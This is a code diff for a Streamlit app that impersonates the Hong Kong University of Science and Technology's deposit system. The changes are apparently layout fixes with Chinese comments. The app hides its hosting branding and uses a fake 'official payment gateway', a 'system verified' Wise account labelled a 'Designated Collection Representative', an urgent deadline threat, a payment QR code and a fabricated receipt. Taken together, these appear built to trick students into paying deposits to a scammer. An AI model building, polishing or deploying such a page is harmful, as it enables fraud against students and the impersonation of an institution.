@@ -8,70 +8,15 @@ st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="w
 
 st.markdown("""
 <style>
-    /* Hide all Streamlit elements and icons */
     #MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
     [data-testid="stHeader"], [data-testid="stStatusWidget"], .stAppDeployButton {display: none !important;}
     iframe[title="Manage app"] {display: none !important;}
-
-    /* Top Navigation Bar Style */
-    .nav-bar { 
-        background-color: #003366; 
-        padding: 15px 60px; 
-        display: flex; 
-        align-items: center; 
-        color: white; 
-        border-bottom: 4px solid #A6937C;
-    }
-    .system-title { 
-        border-left: 2px solid #fff; 
-        padding-left: 15px; 
-        margin-left: 15px; 
-        font-size: 18px; 
-        font-weight: 500; 
-    }
-
-    /* Main Card Styling */
-    .payment-card {
-        background-color: #FFFFFF !important; 
-        padding: 35px; 
-        border-radius: 8px; 
-        box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
-        border: 1px solid #ddd;
-        color: #000 !important;
-    }
-
-    /* Official Info Box (Visual Mask) */
-    .official-info-box {
-        background-color: #f8f9fa;
-        border: 1px dashed #003366;
-        padding: 15px;
-        border-radius: 5px;
-        margin: 15px 0;
-        text-align: center;
-    }
-
-    /* Urgent Deadline Notice */
-    .deadline-box {
-        color: #d32f2f !important; 
-        font-weight: bold; 
-        font-size: 15px; 
-        background-color: #f8d7da !important; 
-        padding: 18px; 
-        border-radius: 4px; 
-        margin: 20px 0;
-        border: 1px solid #f5c6cb;
-    }
-
-    /* Wise Security Notice */
-    .wise-notice {
-        background-color: #fffbe6;
-        border: 1px solid #ffe58f;
-        padding: 12px;
-        border-radius: 5px;
-        margin-bottom: 20px;
-        font-size: 13px;
-        color: #856404;
-    }
+    .nav-bar { background-color: #003366; padding: 15px 60px; display: flex; align-items: center; color: white; border-bottom: 4px solid #A6937C; }
+    .system-title { border-left: 2px solid #fff; padding-left: 15px; margin-left: 15px; font-size: 18px; font-weight: 500; }
+    .payment-card { background-color: #FFFFFF !important; padding: 35px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #ddd; color: #000 !important; }
+    .official-info-box { background-color: #f8f9fa; border: 1px dashed #003366; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: center; }
+    .deadline-box { color: #d32f2f !important; font-weight: bold; font-size: 15px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 20px 0; border: 1px solid #f5c6cb; }
+    .wise-notice { background-color: #fffbe6; border: 1px solid #ffe58f; padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 13px; color: #856404; }
 </style>
 """, unsafe_allow_html=True)
 
@@ -83,7 +28,7 @@ CNY = "45,000"
 if 'step' not in st.session_state:
     st.session_state.step = "input"
 
-# --- 3. Top Navigation ---
+# --- 3. Navigation Bar ---
 st.markdown(f"""
 <div class="nav-bar">
 <img src="https://hkust.edu.hk" height="45">
@@ -96,7 +41,8 @@ st.markdown(f"""
 # [STEP 1: Initial Payment Confirmation]
 if st.session_state.step == "input":
     st.write("## ")
-    col1, col2, col3 = st.columns()
+    # 修復：這裡加入了參數 [1, 2, 1]
+    col1, col2, col3 = st.columns([1, 2, 1])
     with col2:
         st.markdown(f"""
 <div class="payment-card">
@@ -114,38 +60,33 @@ Please complete the payment by 4:00 PM on April 24th. Failure to do so will resu
             st.session_state.step = "pay_now"
             st.rerun()
 
-# [STEP 2: Scanning Page with Wise QR]
+# [STEP 2: Scanning Page]
 elif st.session_state.step == "pay_now":
     st.write("## ")
-    col1, col2, col3 = st.columns([1, 1.2, 1])
+    # 修復：這裡加入了參數 [1, 1.5, 1]
+    col1, col2, col3 = st.columns([1, 1.5, 1])
     with col2:
         st.markdown(f"""
 <div style="background:white; padding:30px; border-radius:10px; border:1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
     <h3 style="text-align:center; color:#003366; margin-top:0;">Official Payment Gateway</h3>
-    
     <div class="official-info-box">
         <span style="color:#666; font-size:13px;">Payment Partner:</span><br>
         <b style="color:#003366; font-size:16px;">WISE SECURE TRANSFER UNIT</b><br>
         <span style="color:#28a745; font-size:12px;">● System Verified Account</span>
     </div>
-
     <p style="text-align:center; font-size:24px; font-weight:bold; color:#003366; margin:10px 0;">Amount: HK$ {HKD}</p>
-    
     <div class="wise-notice">
         <b>🔒 Security Security Notice:</b><br>
         You are using our encrypted cross-border gateway (Wise). The recipient may appear as a <b>Designated Collection Representative</b>. This is a verified account for <b>MSc in TLE</b> program deposits.
     </div>
-
     <p style="text-align:center; color:#666; font-size:14px;">Scan the QR Code below to proceed</p>
 </div>
 """, unsafe_allow_html=True)
 
-        # Use your Wise QR code image
         if os.path.exists("your_qr.png"):
             st.image("your_qr.png", use_container_width=True)
         else:
-            # Fallback test QR code (Replace the data URL with your real Wise Link)
-            st.image(f"https://qrserver.com_{PAYER}", width=400)
+            st.image(f"https://qrserver.com_{PAYER.replace(' ', '_')}", width=400)
         
         st.write("")
         if st.button("I HAVE COMPLETED THE PAYMENT", use_container_width=True, type="primary"):
@@ -195,9 +136,12 @@ elif st.session_state.step == "receipt":
     </div>
 </div>
 """, unsafe_allow_html=True)
+    
     st.write("")
-    if st.button("PRINT / SAVE AS PDF", use_container_width=True):
-        st.info("Browser print dialog opening... Please select 'Save as PDF'.")
+    # 修復：這裡加入了參數 [1, 2, 1]
+    c1, c2, c3 = st.columns([1, 2, 1])
+    with c2:
+        if st.button("PRINT / SAVE AS PDF", use_container_width=True):
+            st.info("Browser print dialog opening... Please select 'Save as PDF'.")
 
-# --- Footer ---
 st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
